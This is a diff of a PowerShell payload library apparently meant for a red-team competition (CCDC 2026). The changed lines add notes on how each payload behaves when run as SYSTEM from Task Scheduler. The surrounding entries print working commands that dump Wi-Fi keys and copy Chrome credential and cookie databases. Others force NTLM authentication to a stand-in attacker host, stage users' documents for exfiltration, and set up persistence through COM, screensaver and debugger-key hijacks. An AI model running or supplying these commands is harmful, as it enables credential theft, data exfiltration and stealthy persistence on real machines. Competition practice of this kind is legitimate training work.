@@ -247,13 +247,13 @@ $Payloads = [ordered]@{
     'CRED-002' = @{
         Desc  = 'Extract Wi-Fi passwords'
         Cmd   = '(netsh wlan show profiles) | Select-String '':(.+)$'' | ForEach-Object { $n=$_.Matches.Groups[1].Value.Trim(); $r=netsh wlan show profile name="$n" key=clear 2>$null; $k=($r | Select-String ''Key Content\s+:\s+(.+)$'').Matches.Groups[1].Value; if($k){"$n : $k"} } | Out-File C:\ProgramData\w.txt -Force'
-        Notes = 'Exports all saved Wi-Fi SSIDs and keys to a text file for later exfil'
+        Notes = 'Exports all saved Wi-Fi SSIDs and keys to a text file for later exfil. SYSTEM CONTEXT CAVEAT: SYSTEM can enumerate profiles but key=clear may be gated on some builds. Test in target environment.'
     }
 
     'CRED-003' = @{
         Desc  = 'Copy Chrome credential databases (decrypt offline with Kali tools)'
         Cmd   = '$cd="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"; if(Test-Path $cd){Copy-Item "$cd\Login Data" -Dest ''C:\ProgramData\ld.db'' -Force; Copy-Item "$cd\Cookies" -Dest ''C:\ProgramData\ck.db'' -Force}'
-        Notes = 'Copies Chrome Login Data and Cookies SQLite DBs — decrypt on Kali with dpapi/mimikatz tools'
+        Notes = 'Copies Chrome Login Data and Cookies SQLite DBs — decrypt on Kali with dpapi/mimikatz tools. SYSTEM CONTEXT WARNING: $env:LOCALAPPDATA resolves to SYSTEM profile, not a real user. Will find no Chrome data from Task Scheduler. Use interactive session or rewrite to enumerate user profiles.'
     }
 
     'CRED-004' = @{
@@ -265,7 +265,7 @@ $Payloads = [ordered]@{
     'CRED-005' = @{
         Desc  = 'Capture NTLMv2 hash via forced auth to attacker (Responder)'
         Cmd   = 'cmd /c "dir \\ATTACKER_IP\share 2>nul"'
-        Notes = 'Replace ATTACKER_IP — triggers NTLM auth. Run Responder on Kali: sudo responder -I eth0'
+        Notes = 'Replace ATTACKER_IP — triggers NTLM auth. Run Responder on Kali: sudo responder -I eth0. SYSTEM CONTEXT CAVEAT: From Task Scheduler this sends the machine account hash (HOSTNAME$), not a user hash. Still useful for relay attacks but not for cracking user passwords.'
     }
 
     # ════════════════════════════════════════════════════════════
@@ -383,7 +383,7 @@ $Payloads = [ordered]@{
     'EXFIL-001' = @{
         Desc  = 'Compress and stage user data for exfil'
         Cmd   = 'Compress-Archive -Path C:\Users\*\Documents\*,C:\Users\*\Desktop\* -DestinationPath C:\ProgramData\backup.zip -Force -CompressionLevel Fastest'
-        Notes = 'Zips all user Documents and Desktop files — transfer via SMB share or download cradle reverse'
+        Notes = 'Zips all user Documents and Desktop files — transfer via SMB share or download cradle reverse. SYSTEM CONTEXT CAVEAT: SYSTEM can access most user profile folders but may be blocked by per-user ACLs on Server 2019+. Test access first.'
     }
 
     'EXFIL-002' = @{
@@ -405,37 +405,37 @@ $Payloads = [ordered]@{
     'FUN-001' = @{
         Desc  = 'Change desktop wallpaper (download from attacker)'
         Cmd   = '$w=New-Object Net.WebClient;$w.DownloadFile(''http://ATTACKER_IP:8080/wallpaper.jpg'',"$env:APPDATA\wp.jpg");Set-ItemProperty ''HKCU:\Control Panel\Desktop'' -Name Wallpaper -Value "$env:APPDATA\wp.jpg";rundll32.exe user32.dll,UpdatePerUserSystemParameters ,1 ,true'
-        Notes = 'Replace ATTACKER_IP — host a fun image on your web server. Wallpaper updates immediately.'
+        Notes = 'Replace ATTACKER_IP — host a fun image on your web server. Wallpaper updates immediately. SYSTEM CONTEXT WARNING: $env:APPDATA and HKCU resolve to SYSTEM profile from Task Scheduler. Wallpaper change will not affect any interactive user. Use interactive session only.'
     }
 
     'FUN-002' = @{
         Desc  = 'Text-to-speech announcement'
         Cmd   = 'Add-Type -AssemblyName System.Speech;(New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(''Attention. Your system has been visited by the red team. Have a wonderful day.'')'
-        Notes = 'Plays TTS audio through system speakers — guaranteed to make blue team do a double-take'
+        Notes = 'Plays TTS audio through system speakers — guaranteed to make blue team do a double-take. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
     }
 
     'FUN-003' = @{
         Desc  = 'Notepad popup with message'
         Cmd   = '"''Red Team Was Here - CCDC 2026 <3''" | Out-File "$env:TEMP\rt.txt" -Force; Start-Process notepad "$env:TEMP\rt.txt"'
-        Notes = 'Simple visible indicator — opens notepad with a message. Good for proving access.'
+        Notes = 'Simple visible indicator — opens notepad with a message. Good for proving access. SYSTEM CONTEXT WARNING: Notepad opens in Session 0 (invisible) from Task Scheduler. No user will see it. Use interactive session only.'
     }
 
     'FUN-004' = @{
         Desc  = 'Invert mouse buttons (subtle chaos)'
         Cmd   = '$sig=''[DllImport("user32.dll")] public static extern bool SwapMouseButton(bool swap);''; $t=Add-Type -MemberDefinition $sig -Name ''WinAPI'' -Namespace ''Mouse'' -PassThru; $t::SwapMouseButton($true)'
-        Notes = 'P/Invoke to swap left/right mouse buttons. Subtle enough to waste time before blue team realizes.'
+        Notes = 'P/Invoke to swap left/right mouse buttons. Subtle enough to waste time before blue team realizes. SYSTEM CONTEXT WARNING: Runs in Session 0 from Task Scheduler — affects SYSTEM desktop, not interactive user mouse. Use interactive session only.'
     }
 
     'FUN-005' = @{
         Desc  = 'Rotate screen 180 degrees (requires display driver support)'
         Cmd   = 'cmd /c "reg add ""HKLM\SYSTEM\CurrentControlSet\Control\Video"" /v Rotation /t REG_DWORD /d 2 /f 2>nul"; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::AllScreens | ForEach-Object { Write-Host "Screen rotated — restart explorer.exe to apply" }'
-        Notes = 'May not work on all display drivers. The registry method requires a display restart to take effect.'
+        Notes = 'May not work on all display drivers. The registry method requires a display restart to take effect. SYSTEM CONTEXT WARNING: Session 0 has no display. No effect from Task Scheduler. Use interactive session only.'
     }
 
     'FUN-006' = @{
         Desc  = 'Continuous random beep (background annoyance)'
         Cmd   = 'while($true){[Console]::Beep((Get-Random -Min 200 -Max 2000),(Get-Random -Min 100 -Max 500));Start-Sleep -Milliseconds (Get-Random -Min 5000 -Max 30000)}'
-        Notes = 'Random frequency beeps at random intervals — maddening but harmless. Runs until process killed.'
+        Notes = 'Random frequency beeps at random intervals — maddening but harmless. Runs until process killed. SYSTEM CONTEXT WARNING: Session 0 has no audio device. Silent from Task Scheduler. Use interactive session only.'
     }
 
     # ════════════════════════════════════════════════════════════
@@ -473,7 +473,7 @@ $Payloads = [ordered]@{
     'NOVEL-002' = @{
         Desc  = 'COM object hijack persistence (survives task cleanup)'
         Cmd   = '$clsid=''{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}''; $p="HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name ''(Default)'' -Value ''C:\ProgramData\update.dll'' -Force; Set-ItemProperty $p -Name ThreadingModel -Value ''Both'' -Force'
-        Notes = 'Hijacks a COM CLSID that explorer.exe loads — provides persistence without scheduled tasks or Run keys'
+        Notes = 'Hijacks a COM CLSID that explorer.exe loads — provides persistence without scheduled tasks or Run keys. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. COM hijack will not trigger for interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
     }
 
     'NOVEL-003' = @{
@@ -485,7 +485,7 @@ $Payloads = [ordered]@{
     'NOVEL-004' = @{
         Desc  = 'Screensaver hijack persistence (triggers on user idle)'
         Cmd   = '$ss=''HKCU:\Control Panel\Desktop''; Set-ItemProperty $ss -Name SCRNSAVE.EXE -Value ''powershell.exe'' -Force; Set-ItemProperty $ss -Name ScreenSaveActive -Value ''1'' -Force; Set-ItemProperty $ss -Name ScreenSaveTimeOut -Value ''300'' -Force; Set-ItemProperty $ss -Name ScreenSaverIsSecure -Value ''0'' -Force'
-        Notes = 'Sets PowerShell as the screensaver — when user is idle for 5 min, PS launches. Combine with a script at a known path.'
+        Notes = 'Sets PowerShell as the screensaver — when user is idle for 5 min, PS launches. Combine with a script at a known path. SYSTEM CONTEXT WARNING: Writes to HKCU which resolves to SYSTEM hive from Task Scheduler. Screensaver hijack will not affect interactive users. Rewrite to use HKU:\<SID> per-user or deploy from interactive session.'
     }
 
     'NOVEL-005' = @{
@@ -497,7 +497,7 @@ $Payloads = [ordered]@{
     'NOVEL-006' = @{
         Desc  = 'Image File Execution Options debugger (hijack common tool)'
         Cmd   = '$target=''notepad.exe''; $p="HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$target"; New-Item -Path $p -Force|Out-Null; Set-ItemProperty $p -Name Debugger -Value ''powershell.exe -NoP -W Hidden -File C:\ProgramData\update.ps1'' -Force'
-        Notes = 'When user runs notepad, it actually runs our script. Change target to any executable blue team might use.'
+        Notes = 'When user runs notepad, it actually runs our script. Change target to any executable blue team might use. SYSTEM CONTEXT CAVEAT: The HKLM write works fine from SYSTEM, but the hijacked process runs as the triggering user, not SYSTEM. This is expected behavior — just note the context switch.'
     }
 
     'NOVEL-007' = @{
